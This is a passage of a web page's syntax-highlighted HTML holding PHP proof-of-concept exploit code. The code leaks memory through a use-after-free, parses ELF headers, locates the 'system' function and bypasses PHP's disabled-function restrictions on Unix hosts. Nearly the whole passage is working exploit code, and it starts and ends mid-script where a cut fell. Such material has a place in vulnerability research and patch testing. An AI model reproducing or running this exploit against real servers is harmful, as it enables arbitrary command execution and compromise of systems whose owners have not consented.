punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">&gt;&gt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$v</span> <span class=\"token operator\">&gt;&gt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$helper</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc8</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$abc_addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$closure_obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$closure_handlers</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string 